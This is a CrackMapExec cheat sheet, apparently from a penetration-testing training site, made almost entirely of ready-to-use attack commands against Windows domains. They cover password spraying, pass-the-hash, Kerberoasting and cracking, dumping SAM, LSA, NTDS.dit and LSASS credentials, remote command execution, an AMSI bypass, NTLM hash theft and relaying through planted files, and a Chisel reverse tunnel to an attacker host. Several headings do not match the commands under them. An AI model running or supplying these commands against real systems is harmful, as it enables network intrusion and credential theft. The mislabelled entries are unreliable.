{"title": "Using CrackMapExec", "source": "cheatsheet", "source_label": "Cheat Sheets", "path": "cheatsheet/using-crackmapexec", "html": "<h1 id=\"using-crackmapexec\">Using CrackMapExec</h1>\n<h3>Connecting to Targets</h3>\n<h3 id=\"protocol-can-be-smb-winrm-mssql-ldap-ssh-rdp-or-ftp\">Protocol can be smb, winrm, mssql, ldap, ssh, rdp or ftp.</h3>\n<pre><code class=\"language-bash\">cme [protocol] 10.10.10.1</code></pre>\n<h3 id=\"target-can-be-a-dns-an-ip-a-file-with-ips-or-dnss-or-cidr\">Target can be a DNS, an IP, a file with IPs or DNSs, or CIDR.</h3>\n<pre><code class=\"language-bash\">cme [protocol] &lt;target&gt;</code></pre>\n<h3 id=\"user-can-be-a-name-a-list-of-names-or-a-file-with-usernames\">User can be a name, a list of names, or a file with usernames.</h3>\n<pre><code class=\"language-bash\">cme [protocol] &lt;target&gt; -u</code></pre>\n<h3 id=\"password-can-be-a-plaintext-password-a-list-of-passwords-or-\">Password can be a plaintext password, a list of passwords, or a file with passwords.</h3>\n<pre><code class=\"language-bash\">cme [protocol] &lt;target&gt; -u &lt;username, list or file with users&gt; -p</code></pre>\n<h3 id=\"hash-can-be-an-ntlm-hash-a-list-of-ntlm-hashes-or-a-file-wit\">Hash can be an NTLM hash, a list of NTLM hashes, or a file with NTLM hashes.</h3>\n<pre><code class=\"language-bash\">cme [protocol] &lt;target&gt; -u &lt;username, list or file with users&gt; -H</code></pre>\n<h3>CME Output</h3>\n<h3 id=\"the-username-and-the-password-is-valid\">The username and the password is valid.</h3>\n<pre><code class=\"language-bash\">&lt;p style=&quot;color:green&quot;&gt;Green [+]&lt;/p&gt;</code></pre>\n<h3 id=\"the-username-or-the-password-is-invalid\">The username or the password is invalid.</h3>\n<pre><code class=\"language-bash\">&lt;p style=&quot;color:red&quot;&gt;Red [-]&lt;/p&gt;</code></pre>\n<h3 id=\"the-username-and-password-are-valid-but-the-authentication-i\">The username and password are valid, but the authentication is not successful.</h3>\n<pre><code class=\"language-bash\">&lt;p style=&quot;color:magenta&quot;&gt;Magenta&lt;/p&gt;</code></pre>\n<h3 id=\"we-are-administrators-on-the-target-machine-or-we-have-high-\">We are administrators on the target machine, or we have high privileges over the target protocol.</h3>\n<pre><code class=\"language-bash\">&lt;p style=&quot;color:yellow&quot;&gt;(Pwn3d!)&lt;/p&gt;</code></pre>\n<h3>CME Specifics Options</h3>\n<h3 id=\"-continue-on-successbr\">`--continue-on-success`&lt;/br&gt;</h3>\n<p>By default CME will exit after a successful login is found. Using the --continue-on-success flag will continue spraying even after a valid password is found.</p>\n<h3 id=\"-no-bruteforce\">--no-bruteforce</h3>\n<p>This option is only useful when &lt;u&gt; and &lt;p&gt; are both files. By default CME will test each user specified by &lt;u&gt; with all the passwords from &lt;p&gt;; the option --no-bruteforce will only test one password per user line by line.</p>\n<h3 id=\"by-default-cme-will-try-to-authenticate-to-the-domain-contro\">By default CME will try to authenticate to the domain controller. To use local authentication on the target.</h3>\n<pre><code class=\"language-bash\">--local-auth</code></pre>\n<h3 id=\"this-option-will-force-kerberos-authentication-on-the-target\">This option will force Kerberos Authentication on the target. Require FQDN.</h3>\n<pre><code class=\"language-bash\">`--kerberos` or `-k`</code></pre>\n<h3 id=\"custom-protocol-port\">Custom PROTOCOL port.</h3>\n<pre><code class=\"language-bash\">--port</code></pre>\n<h3>Exporting</h3>\n<h3 id=\"export-the-output-into-a-json-format\">Export the output into a JSON format.</h3>\n<pre><code class=\"language-bash\">--export $(pwd)/output.txt</code></pre>\n<h3 id=\"format-output-to-use-with-jq-application\">Format output to use with jq application.</h3>\n<pre><code class=\"language-bash\">sed -i &quot;s/&#x27;/\\&quot;/g&quot; &lt;output_export&gt;</code></pre>\n<h3 id=\"an-alternative-if-a-command-doesnt-support-export-is-to-redi\">An alternative if a command doesn&#x27;t support export is to redirect the output to a file with &gt;.</h3>\n<pre><code class=\"language-bash\">cme [protocol] &lt;target&gt; &gt; output.txt</code></pre>\n<h3>Authentication &amp; Password Spraying</h3>\n<h3 id=\"testing-anonymous-logon\">Testing anonymous logon.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -u &#x27;nop&#x27; -p &#x27;</code></pre>\n<h3 id=\"testing-domain-authentication-on-the-target\">Testing Domain authentication on the target.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -u &lt;u&gt; -p/-H &lt;p&gt;/&lt;H&gt;</code></pre>\n<h3 id=\"testing-domain-authentication-on-the-target-continue-even-if\">Testing Domain authentication on the target, continue even if one valid credential found.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -u &lt;u&gt; -p/-H &lt;p&gt;/&lt;H&gt; --continue-on-success</code></pre>\n<h3 id=\"use-aes-128-or-aes-256-hashes-for-kerberos-authentication\">Use AES-128 or AES-256 hashes for Kerberos Authentication.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -u &lt;u&gt; --aesKey &lt;AES_128/AES_256&gt;</code></pre>\n<h3 id=\"testing-domain-authentication-on-the-target-when-u-and-p-are\">Testing Domain authentication on the target when &lt;u&gt; and &lt;p&gt; are both files.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; --no-bruteforce</code></pre>\n<h3 id=\"cme-smb-target-u-u-p-p-d-domain\">cme smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; -d &lt;domain&gt;</h3>\n<p>Testing Domain authentication on the target by forcing the domain name Add this option to all the commands above if you want to force the domain</p>\n<h3 id=\"use-ccache-file-for-kerberos-authentication\">Use ccache file for Kerberos authentication.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; --use-kcache</code></pre>\n<h3>SMB Enumeration</h3>\n<h3 id=\"enumerate-available-hosts-os-version-smb-version-ip\">Enumerate available hosts (OS version, SMB version, IP).</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt;</code></pre>\n<h3 id=\"maps-the-network-of-live-hosts-and-saves-a-list-of-only-the-\">Maps the network of live hosts and saves a list of only the hosts that don&#x27;t require SMB signing.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; --gen-relay-list output.txt</code></pre>\n<h3 id=\"enumerate-active-sessions-on-the-target\">Enumerate active sessions on the target.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; --sessions</code></pre>\n<h3 id=\"enumerate-permissions-on-all-shares-of-the-target\">Enumerate permissions on all shares of the target.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; --shares</code></pre>\n<h3 id=\"enumerate-disks-on-the-target\">Enumerate disks on the target.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; --disks</code></pre>\n<h3 id=\"enumerate-computers-on-the-target-domain\">Enumerate computers on the target domain.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; --computers</code></pre>\n<h3 id=\"enumerate-logged-users-on-the-target\">Enumerate logged users on the target.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; --loggedon-users</code></pre>\n<h3 id=\"enumerate-domain-users-on-the-target\">Enumerate domain users on the target.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; --users</code></pre>\n<h3 id=\"enumerate-users-by-bruteforcing-the-rid-on-the-target-by-def\">Enumerate users by bruteforcing the RID on the target. By default up to 4000.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; --rid-brute [MAX_RID]</code></pre>\n<h3 id=\"enumerate-logged-users-on-the-target\">Enumerate logged users on the target.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; --loggedon-users</code></pre>\n<h3 id=\"enumerate-domain-groups-on-the-target\">Enumerate domain groups on the target.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; --groups</code></pre>\n<h3 id=\"enumerate-local-groups-on-the-target\">Enumerate local groups on the target.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; --local-group</code></pre>\n<h3 id=\"enumerate-password-policy-of-the-domain\">Enumerate Password policy of the domain.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; --pass-pol</code></pre>\n<h3 id=\"issues-the-specified-wmi-query\">Issues the specified WMI query.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; --wmi</code></pre>\n<h3 id=\"wmi-namespace-default-rootcimv2\">WMI Namespace (default: root\\cimv2).</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; --wmi-namespace</code></pre>\n<h3>LDAP Enumeration</h3>\n<h3 id=\"enumerate-enabled-domain-users\">Enumerate enabled domain users.</h3>\n<pre><code class=\"language-bash\">cme ldap &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; --users</code></pre>\n<h3 id=\"enumerate-domain-groups\">Enumerate domain groups.</h3>\n<pre><code class=\"language-bash\">cme ldap &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; --groups</code></pre>\n<h3 id=\"get-the-list-of-users-with-flag-passwdnotreqd\">Get the list of users with flag PASSWD_NOTREQD.</h3>\n<pre><code class=\"language-bash\">cme ldap &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; --password-not-required</code></pre>\n<h3 id=\"get-the-list-of-users-and-computers-with-flag-trustedfordele\">Get the list of users and computers with flag TRUSTED_FOR_DELEGATION.</h3>\n<pre><code class=\"language-bash\">cme ldap &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; --trusted-for-delegation</code></pre>\n<h3 id=\"get-objets-that-had-the-value-admincount1\">Get objets that had the value adminCount=1.</h3>\n<pre><code class=\"language-bash\">cme ldap &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; ---admin-count</code></pre>\n<h3 id=\"get-domain-sid\">Get domain sid.</h3>\n<pre><code class=\"language-bash\">cme ldap &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; --get-sid</code></pre>\n<h3 id=\"enumerate-gmsa-passwords\">Enumerate GMSA passwords.</h3>\n<pre><code class=\"language-bash\">cme ldap &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; --gmsa</code></pre>\n<h3>RDP Enumeration</h3>\n<h3 id=\"if-nla-is-disabled-it-will-allow-you-to-take-a-screenshot-of\">If NLA is disabled it will allow you to take a screenshot of the login prompt.</h3>\n<pre><code class=\"language-bash\">cme rdp &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; --nla-screenshot</code></pre>\n<h3 id=\"enumerate-active-sessions-on-the-target\">Enumerate active sessions on the target.</h3>\n<pre><code class=\"language-bash\">cme rdp &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; --screenshot</code></pre>\n<h3 id=\"enumerate-permissions-on-all-shares-of-the-target\">Enumerate permissions on all shares of the target.</h3>\n<pre><code class=\"language-bash\">cme rdp &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; --screentime &lt;SCREENTIME&gt;</code></pre>\n<h3 id=\"enumerate-active-sessions-on-the-target\">Enumerate active sessions on the target.</h3>\n<pre><code class=\"language-bash\">cme rdp &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; --res &lt;RESOLUTION&gt;</code></pre>\n<h3>Finding Accounts</h3>\n<h3 id=\"retrieve-the-kerberos-5-as-rep-etype-23-hash-of-users-withou\">Retrieve the Kerberos 5 AS-REP etype 23 hash of users without Kerberos pre-authentication required.</h3>\n<pre><code class=\"language-bash\">cme ldap &lt;target_fqdn&gt; -u &lt;u&gt; -p &lt;p&gt; --asreproast asreproast.out</code></pre>\n<h3 id=\"retrieve-the-kerberos-5-tgs-rep-etype-23-hash-using-kerberoa\">Retrieve the Kerberos 5 TGS-REP etype 23 hash using Kerberoasting technique.</h3>\n<pre><code class=\"language-bash\">cme ldap &lt;target_fqdn&gt; -u &lt;u&gt; -p &lt;p&gt; --kerberoasting kerberoasting.out</code></pre>\n<h3 id=\"module-for-cracking-asreproast\">Module for Cracking ASREPRoast.</h3>\n<pre><code class=\"language-bash\">hashcat -m 18200 asreproast.out /usr/share/wordlists/rockyou.txt --force</code></pre>\n<h3 id=\"module-for-cracking-asreproast\">Module for Cracking ASREPRoast.</h3>\n<pre><code class=\"language-bash\">hashcat -m 13100 kerberoasting.out /usr/share/wordlists/rockyou.txt --force</code></pre>\n<h3>MSSQL Enumeration and Attacks</h3>\n<h3 id=\"perform-an-sql-query-againts-the-target-machine\">Perform an SQL Query againts the target machine.</h3>\n<pre><code class=\"language-bash\">cme mssql &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; -q &lt;SQL_QUERY&gt;</code></pre>\n<h3 id=\"executing-windows-command-on-the-target-if-the-option-xpcmds\">Executing Windows command on the target if the option xp_cmdshell is available to the user.</h3>\n<pre><code class=\"language-bash\">cme mssql &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; -x &lt;command&gt;</code></pre>\n<h3 id=\"enumerates-mssql-privileges-to-scale-from-a-standard-user-in\">Enumerates MSSQL privileges to scale from a standard user into a sysadmin.</h3>\n<pre><code class=\"language-bash\">cme mssql &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; -M mssql_priv</code></pre>\n<h3 id=\"exploit-mssql-privileges-to-scale-from-a-standard-user-into-\">Exploit MSSQL privileges to scale from a standard user into a sysadmin.</h3>\n<pre><code class=\"language-bash\">cme mssql &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; -M mssql_priv -o ACTION=privesc</code></pre>\n<h3 id=\"rollback-users-privileges-to-standard-user\">Rollback user&#x27;s privileges to standard user.</h3>\n<pre><code class=\"language-bash\">cme mssql &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; -M mssql_priv -o ACTION=rollback</code></pre>\n<h3 id=\"get-a-remote-file-from-a-shared-folder\">Get a remote file from a shared folder.</h3>\n<pre><code class=\"language-bash\">cme mssql &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; --share &lt;share_name&gt; --get-file &lt;remote_filename&gt; &lt;output_filename&gt;</code></pre>\n<h3 id=\"put-a-local-file-into-a-remote-location\">Put a local file into a remote location.</h3>\n<pre><code class=\"language-bash\">cme mssql &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; --share &lt;share_name&gt; --put-file &lt;local_filename&gt; &lt;remote_filename&gt;</code></pre>\n<h3>Domain Enumeration</h3>\n<h3 id=\"retrieves-the-plaintext-password-and-other-information-for-a\">Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences (GPP).</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; -M gpp_password</code></pre>\n<h3 id=\"searches-the-domain-controller-for-registryxml-to-find-autol\">Searches the domain controller for registry.xml to find autologin information and returns the username and password.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; -M gpp_autologin</code></pre>\n<h3>File Operations</h3>\n<h3 id=\"search-in-a-remote-share-for-a-pattern\">Search in a remote share for a pattern.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; --spider &lt;share_name&gt; --pattern &lt;pattern&gt;</code></pre>\n<h3 id=\"search-in-a-remote-share-using-regular-expression\">Search in a remote share using regular expression.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; --spider &lt;share_name&gt; --regex &lt;regex&gt;</code></pre>\n<h3 id=\"enable-content-search-can-be-combined-with-pattern-or-regex\">Enable content search. Can be combined with --pattern or --regex.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; --spider &lt;share_name&gt; --content</code></pre>\n<h3 id=\"get-a-remote-file-from-a-shared-folder\">Get a remote file from a shared folder.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; --share &lt;share_name&gt; --get-file &lt;remote_filename&gt; &lt;output_filename&gt;</code></pre>\n<h3 id=\"put-a-local-file-into-a-remote-location\">Put a local file into a remote location.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; --share &lt;share_name&gt; --put-file &lt;local_filename&gt; &lt;remote_filename&gt;</code></pre>\n<h3 id=\"cme-smb-target-u-u-p-p-m-spiderplus-o-excludediripcprintnetl\">cme smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; -M spider_plus -o EXCLUDE_DIR=IPC$,print$,NETLOGON,SYSVOL</h3>\n<p>Creates a file containing the shares and files information. We can add the option EXCLUDE_DIR to prevent it from looking into specific shared folders.</p>\n<h3 id=\"download-all-files-from-all-shared-folder\">Download all files from all shared folder.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; -M spider_plus -o READ_ONLY=false</code></pre>\n<h3>Using Proxychains and Chisel</h3>\n<h3 id=\"method-1-using-our-attack-host-as-the-chisel-server\">Method #1 - Using our attack host as the chisel server.</h3>\n<pre><code class=\"language-bash\">chisel server --reverse</code></pre>\n<h3 id=\"method-1-using-the-target-machine-as-the-chisel-client\">Method #1 - Using the target machine as the Chisel client.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; -x &quot;C:\\Windows\\Temp\\chisel.exe client 10.10.14.33:8080 R:socks&quot;</code></pre>\n<h3 id=\"method-2-using-the-target-machine-as-the-chisel-server\">Method #2 - Using the target machine as the Chisel server.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; -x &quot;C:\\Windows\\Temp\\chisel.exe server --socks5&quot;</code></pre>\n<h3 id=\"method-2-using-our-attack-host-as-the-chisel-client\">Method #2 - Using our attack host as the Chisel client.</h3>\n<pre><code class=\"language-bash\">chisel client &lt;target-ip&gt;:8080 socks</code></pre>\n<h3>Stealing Hashes</h3>\n<h3 id=\"cme-smb-target-u-u-p-p-m-slinky-o-serveryourip-namelnkfilena\">cme smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; -M slinky -o SERVER=&lt;YOUR_IP&gt; NAME=&lt;LNK_filename</h3>\n<p>Creates windows shortcuts with the icon attribute containing a UNC path to the specified SMB server in all shares with write permissions.</p>\n<h3 id=\"start-responder-to-listen-for-requests\">Start Responder to listen for requests.</h3>\n<pre><code class=\"language-bash\">sudo responder -I tun0</code></pre>\n<h3 id=\"relay-ntlmv2-to-the-target-machine\">Relay NTLMv2 to the target machine.</h3>\n<pre><code class=\"language-bash\">ntlmrelayx.py -t &lt;target&gt; -smb2support --no-http</code></pre>\n<h3 id=\"search-and-delete-the-lnk-file-in-all-shares-or-the-selected\">Search and delete the LNK file in all shares or the selected shared folder.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; -M slinky -o SERVER=&lt;YOUR_IP&gt; NAME=&lt;LNK_filename CLEAN=YES</code></pre>\n<h3 id=\"cme-smb-target-u-u-p-p-m-drop-sc-o-urlyouripsecret-shareshar\">cme smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; -M drop-sc -o URL=\\\\\\\\&lt;YOUR_IP&gt;\\\\secret SHARE=&lt;shared_folder&gt; FILENAME=&lt;filename&gt;</h3>\n<p>Creates a .searchConnector-ms with an attribute containing a UNC path to the specified SMB server in the selected shared folder.</p>\n<h3 id=\"search-and-delete-the-searchconnector-ms-file-in-the-selecte\">Search and delete the .searchConnector-ms file in the selected shared folder.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; -M drop-sc -o CLEANUP=True FILENAME=&lt;filename&gt;</code></pre>\n<h3>Command Execution</h3>\n<h3 id=\"execute-the-cmd-command-on-the-target\">Execute the CMD &lt;command&gt; on the target.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; -x &lt;command&gt;</code></pre>\n<h3 id=\"execute-powershell-command-on-the-target\">Execute Powershell &lt;command&gt; on the target.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; -X &lt;command&gt;</code></pre>\n<h3 id=\"execute-the-cmd-command-on-the-target-using-winrm-protocol\">Execute the CMD &lt;command&gt; on the target using WinRM protocol.</h3>\n<pre><code class=\"language-bash\">cme winrm &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; -x &lt;command&gt;</code></pre>\n<h3 id=\"execute-the-powershell-command-on-the-target-using-winrm-pro\">Execute the Powershell &lt;command&gt; on the target using WinRM protocol.</h3>\n<pre><code class=\"language-bash\">cme winrm &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; -X &lt;command&gt;</code></pre>\n<h3 id=\"executing-remote-command-on-the-target\">Executing remote command on the target.</h3>\n<pre><code class=\"language-bash\">cme ssh &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; -x &lt;command&gt;</code></pre>\n<h3 id=\"using-private-keys-as-the-authentication-method\">Using private keys as the authentication method.</h3>\n<pre><code class=\"language-bash\">cme ssh &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; --key-file &lt;KEY_FILE&gt; -x &lt;command&gt;</code></pre>\n<h3 id=\"method-to-execute-the-command-ignored-if-in-mssql-mode-defau\">Method to execute the command. Ignored if in MSSQL mode (default: wmiexec).</h3>\n<pre><code class=\"language-bash\">--exec-method &lt;EXEC_METHOD&gt;</code></pre>\n<h3 id=\"file-with-a-custom-amsi-bypass\">File with a custom AMSI bypass.</h3>\n<pre><code class=\"language-bash\">--amsi-bypass &lt;FILE&gt;</code></pre>\n<h3>Extracting Secrets</h3>\n<h3 id=\"dump-sam-on-the-target\">Dump SAM on the target.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; --sam</code></pre>\n<h3 id=\"dump-lsa-on-the-target\">Dump LSA on the target.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; --lsa</code></pre>\n<h3 id=\"dump-ntdsdit-on-the-domain-controller-using-drsuapi-method\">Dump NTDS.dit on the domain controller using drsuapi method.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; --ntds</code></pre>\n<h3 id=\"dump-ntdsdit-on-the-domain-controller-using-the-vss-method\">Dump NTDS.dit on the domain controller using the VSS method.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; --ntds vss</code></pre>\n<h3 id=\"dump-the-memory-of-the-lsass-process-with-lsassy\">Dump the memory of the LSASS process with lsassy.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; -M lsassy</code></pre>\n<h3 id=\"dump-the-memory-of-the-lsass-process-with-procdump\">Dump the memory of the LSASS process with procdump.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; -M procdump</code></pre>\n<h3 id=\"dump-the-memory-of-the-lsass-process-with-handlekatz\">Dump the memory of the LSASS process with handlekatz.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; -M handlekatz</code></pre>\n<h3 id=\"dump-the-memory-of-the-lsass-process-with-nanodump\">Dump the memory of the LSASS process with nanodump.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; -M nanodump</code></pre>\n<h3>Popular Modules</h3>\n<h3 id=\"show-module-options\">Show module options.</h3>\n<pre><code class=\"language-bash\">cme [protocol] -M &lt;module_name&gt; --options</code></pre>\n<h3 id=\"get-dns-and-ip-information\">Get DNS and IP information.</h3>\n<pre><code class=\"language-bash\">cme ldap  &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; -M get-network -o ALL=true</code></pre>\n<h3 id=\"retrieve-all-computers-an-account-has-access-to-read\">Retrieve all computers an account has access to read.</h3>\n<pre><code class=\"language-bash\">cme ldap  &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; -M laps</code></pre>\n<h3 id=\"get-the-machine-account-quota-for-a-user\">Get the machine account quota for a user.</h3>\n<pre><code class=\"language-bash\">cme ldap  &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; -M maq</code></pre>\n<h3 id=\"read-all-aces-of-the-target-account\">Read all ACEs of the target account.</h3>\n<pre><code class=\"language-bash\">cme ldap  &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; -M daclread -o TARGET=&lt;username&gt; ACTION=&lt;read&gt;</code></pre>\n<h3 id=\"read-all-objects-with-dcsync-privileges\">Read all objects with DCSync privileges.</h3>\n<pre><code class=\"language-bash\">cme ldap  &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; -M daclread -o TARGET_DN=&lt;DN&gt; ACTION=read RIGHTS=DCSync</code></pre>\n<h3 id=\"locate-the-keepass-configuration-file-in-the-target-machine\">Locate the KeePass configuration file in the target machine.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; -M keepass_discover</code></pre>\n<h3 id=\"perform-a-chain-attack-to-obtain-the-keepass-database\">Perform a chain attack to obtain the KeePass database.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; -M keepass_trigger -o ACTION=ALL KEEPASS_CONFIG_PATH=&lt;PATH_TO_KEEPASS_CONF&gt;</code></pre>\n<h3 id=\"enable-or-disable-rdp\">Enable or Disable RDP.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; -M rdp -o ACTION=&lt;enable/disable&gt;</code></pre>\n<h3>Vulnerability Scan Modules</h3>\n<h3 id=\"module-to-check-if-the-dc-is-vulnerable-to-zerologon-aka-cve\">Module to check if the DC is vulnerable to Zerologon, aka CVE-2020-1472.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -M Zerologon</code></pre>\n<h3 id=\"module-to-check-if-the-dc-is-vulnerable-to-petitpotam-credit\">Module to check if the DC is vulnerable to PetitPotam, credit to @topotam.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -M PetitPotam</code></pre>\n<h3 id=\"module-to-check-if-the-target-is-vulnerable-to-ms17-010\">Module to check if the target is vulnerable to MS17-010.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -M ms17-010</code></pre>\n<h3 id=\"check-if-the-dc-is-vulnerable-to-cve-2021-42278-and-cve-2021\">Check if the DC is vulnerable to CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; -M nopac</code></pre>\n<h3 id=\"module-to-check-if-the-dc-is-vulnerable-to-dfscocerc-credit-\">Module to check if the DC is vulnerable to DFSCocerc, credit to @filip_dragovic/@Wh04m1001 and @topotam.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; -M dfscoerce</code></pre>\n<h3 id=\"module-to-check-if-the-target-is-vulnerable-to-shadowcoerce-\">Module to check if the target is vulnerable to ShadowCoerce, credit to @Shutdown and @topotam.</h3>\n<pre><code class=\"language-bash\">cme smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; -M shadowcoerce</code></pre>\n<h3>CMEDB Commands</h3>\n<h3 id=\"list-workspaces\">List workspaces.</h3>\n<pre><code class=\"language-bash\">workspace list</code></pre>\n<h3 id=\"switch-to-an-specific-workspace\">Switch to an specific workspace.</h3>\n<pre><code class=\"language-bash\">workspace &lt;workspace&gt;</code></pre>\n<h3 id=\"access-protocol-database\">Access protocol database.</h3>\n<pre><code class=\"language-bash\">proto &lt;protocol&gt;</code></pre>\n<h3 id=\"display-plaintext-and-hashes-credentials-for-a-specific-prot\">Display plaintext and hashes credentials for a specific protocol.</h3>\n<pre><code class=\"language-bash\">creds</code></pre>\n<h3 id=\"display-plaintext-credentials-for-a-specific-protocol\">Display plaintext credentials for a specific protocol.</h3>\n<pre><code class=\"language-bash\">creds plaintext</code></pre>\n<h3 id=\"display-hashes-credentials-for-a-specific-protocol\">Display hashes credentials for a specific protocol.</h3>\n<pre><code class=\"language-bash\">creds hash</code></pre>\n<h3 id=\"display-credentials-for-specific-user\">Display credentials for specific user.</h3>\n<pre><code class=\"language-bash\">creds &lt;username&gt;</code></pre>\n<h3 id=\"manually-add-a-user-to-the-database\">Manually add a user to the database.</h3>\n<pre><code class=\"language-bash\">creds add</code></pre>\n<h3 id=\"manually-remove-a-user-from-the-database\">Manually remove a user from the database.</h3>\n<pre><code class=\"language-bash\">creds remove</code></pre>\n<h3 id=\"display-the-computers-to-which-we-have-gained-access\">Display the computers to which we have gained access.</h3>\n<pre><code class=\"language-bash\">hosts</code></pre>\n<h3 id=\"display-shared-folder-information\">Display shared folder information.</h3>\n<pre><code class=\"language-bash\">shares</code></pre>\n<h3 id=\"export-credentials\">Export credentials.</h3>\n<pre><code class=\"language-bash\">export creds &lt;simple/detailed&gt; 